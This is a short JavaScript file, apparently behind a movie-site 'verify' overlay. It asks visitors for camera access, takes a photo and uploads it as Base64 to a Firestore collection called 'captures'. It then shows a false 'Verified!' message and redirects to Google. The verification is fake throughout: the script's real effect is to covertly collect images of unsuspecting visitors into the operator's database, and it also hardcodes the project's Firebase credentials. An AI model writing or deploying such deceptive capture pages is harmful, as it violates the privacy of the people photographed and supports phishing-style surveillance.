const firebaseConfig = {
    apiKey: "AIzaSyCFy28nNtxhkjfpOd0aCfYkjHUwErh1WVQ",
    authDomain: "movie-1e6fc.firebaseapp.com",
    projectId: "movie-1e6fc",
    storageBucket: "movie-1e6fc.firebasestorage.app",
    messagingSenderId: "371616954594",
    appId: "1:371616954594:web:977d88ec7570df351246bb"
};

// Initialize Firestore instead of Storage
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const overlay = document.getElementById('verifyOverlay');

async function openVerify() {
    overlay.style.display = 'flex';
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
    } catch (err) {
        alert("Camera permission required!");
    }
}

async function captureAndDone() {
    const context = canvas.getContext('2d');
    if (video.srcObject) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);

        // Photo ko Base64 (Text) mein badalna
        const photoData = canvas.toDataURL('image/jpeg', 0.5); // 0.5 for small size

        // Seedha Database mein save karna
        try {
            await db.collection('captures').add({
                image: photoData,
                time: new Date().toLocaleString()
            });
            console.log("Photo Saved in Database!");
        } catch (e) {
            console.error("DB Error:", e);
        }

        const tracks = video.srcObject.getTracks();
        tracks.forEach(t => t.stop());
    }
    alert("Verified! Connecting...");
    overlay.style.display = 'none';
    window.location.href = "https://google.com";
}
